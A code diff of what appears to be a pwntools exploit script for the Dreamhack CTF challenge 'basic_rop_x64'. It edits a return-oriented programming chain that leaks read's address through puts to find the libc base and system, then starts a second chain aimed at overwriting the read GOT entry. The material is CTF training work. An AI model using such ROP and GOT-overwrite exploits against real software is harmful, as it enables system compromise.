@@ -7,7 +7,7 @@ def slog(n, m): return success(": ".join([n, hex(m)]))
 
 # Connection
 HOST = 'host3.dreamhack.games'
-PORT = 14828
+PORT = 17723
 p = remote(HOST, PORT)
 e = ELF('./basic_rop_x64')
 libc = ELF('./libc.so.6')
@@ -20,6 +20,7 @@ context.endian = 'little'
 # Exploit
 read_plt = e.plt['read']
 puts_plt = e.plt['puts']
+read_got = e.got['read']
 main = e.symbols['main']
 pop_rdi = 0x0000000000400883
 pop_rsi_r15 = 0x0000000000400881
@@ -38,7 +39,7 @@ payload += p64(pop_rdi) + p64(read_got)
 payload += p64(puts_plt)
 payload += p64(main)
 
-p.sendafter(buf, payload)
+p.send(payload)
 p.recvuntil(buf)
 read = u64(p.recv(6) + b'\x00\x00')
 libc_base = read - libc.symbols['read']
@@ -47,8 +48,8 @@ slog('read', read)
 slog('libc_base', libc_base)
 slog('system', system)
 
-# Return to main
-payload = buf + b'A' * 0x08  # buf + sfp
+## Return to main
+payload = buf + b'A' * 0x08 # buf + sfp
 
 ## read(0, read_got, 0x10)
 payload += p64(pop_rdi) + p64(0)
